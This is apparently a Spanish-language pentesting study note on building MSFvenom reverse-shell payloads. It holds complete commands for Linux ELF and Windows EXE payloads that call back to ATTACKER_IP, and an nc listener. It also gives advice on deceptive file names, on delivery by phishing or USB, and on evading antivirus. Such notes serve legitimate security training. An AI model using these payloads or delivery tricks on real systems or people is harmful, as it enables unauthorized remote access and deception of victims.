---
tags:
  - metasploit
  - payload
---
## Conceptos Clave (TL;DR)

* MSFvenom permite crear payloads personalizados para acceder a sistemas vulnerables cuando no se cuenta con acceso directo a la red, facilitando ataques de ingeniería social (phishing, USBs) o ejecución manual.
* **Staged Payloads**: Envían una porción pequeña del código ("stage") que al ejecutarse descarga el resto del payload desde el atacante. Ocupan menos memoria, pero requieren conexión estable. Se identifican por las barras `/` en el nombre (ej. `shell/reverse_tcp`).
* **Stageless Payloads**: Contienen toda la funcionalidad y comunicación en un solo bloque. Son ideales para redes con baja latencia, generan sesiones más estables y facilitan la evasión de red al transmitir menos tráfico. Se identifican por guiones bajos `_` (ej. `shell_reverse_tcp`).
* Los payloads pueden ser encriptados y codificados mediante la herramienta para evitar detecciones estáticas de antivirus (AV).

### Herramientas Clave

* **MSFvenom**: Generación, codificación y empaquetado de payloads para diversas plataformas y arquitecturas.
* **Netcat (nc)**: Utilidad de red básica empleada como listener (servidor de escucha) para capturar las conexiones salientes (reverse shells) generadas por los payloads.

### Metodología Paso a Paso

1. **Fase 1: Selección del Payload**    Identifica el sistema operativo objetivo (Windows, Linux, OSX) y la arquitectura (x86, x64). Selecciona el tipo de payload (staged vs stageless) ponderando restricciones de memoria frente a la estabilidad de la red.
2. **Fase 2: Generación del Payload**    Utiliza MSFvenom para compilar el payload. Debes especificar la dirección de conexión inversa (IP y puerto del atacante) y el formato del archivo ejecutable (ELF para Linux, EXE para Windows). Otorga un nombre al archivo que fomente el engaño si la entrega requiere interacción del usuario.
3. **Fase 3: Preparación del Listener**    Antes de enviar o ejecutar el payload, levanta un listener en la máquina atacante en el puerto exacto configurado durante la generación para capturar la conexión entrante.
4. **Fase 4: Distribución y Ejecución**    Posiciona el payload en el objetivo (correo electrónico, servidor web para descarga, dispositivo USB físico o ejecución post-explotación) y logra su ejecución para establecer la sesión

### Cheat Sheet de Comandos

```bash
# Lista todos los payloads disponibles en el framework de Metasploit.

msfvenom -l payloads
```

```bash
# -p: Define el payload stageless para Linux 64-bit (reverse tcp).
# LHOST: IP del atacante para recibir la conexión.
# LPORT: Puerto del atacante a la escucha.
# -f: Formato de salida del archivo (elf).
# >: Redirige el output al archivo malicioso deseado.

msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> -f elf > <OUTPUT_FILE>.elf
```

```bash
# -p: Define el payload stageless para Windows x86 (reverse tcp).
# LHOST: IP del atacante para recibir la conexión.
# LPORT: Puerto del atacante a la escucha.
# -f: Formato de salida del archivo (exe).
# >: Redirige el output al archivo malicioso deseado.

msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> -f exe > <OUTPUT_FILE>.exe
```

```bash
# -l: Modo escucha (listen).
# -v: Modo verboso.
# -n: No resolver resolución DNS de IPs.
# -p: Especifica el puerto local a la escucha.

sudo nc -lvnp <ATTACKER_PORT>
```

### "Gotchas" y Troubleshooting

* **Detección de AV**: Un ejecutable generado por MSFvenom (especialmente en Windows) sin codificación ni ofuscación adicional será bloqueado de inmediato por Windows Defender u otras soluciones AV modernas.
* **Convención de Nombres**: La diferencia sintáctica crítica al buscar payloads de [Metasploit](../../../%F0%9F%93%81%2003_Explotacion_y_Acceso_Inicial/Shells%20&%20Payloads/Payloads/Metasploit.md) es el separador final. `windows/meterpreter/reverse_tcp` (con `/`) es _Staged_, mientras que `windows/meterpreter_reverse_tcp` (con `_`) es _Stageless_. Revisa siempre esta sintaxis.
* **Inestabilidad de Staged**: Si tienes fallos o desconexiones recurrentes al intentar recibir un shell mediante un payload Staged, cambia a una variante Stageless. Los payloads Staged son susceptibles a fallar en redes con mucha latencia o poco ancho de banda.
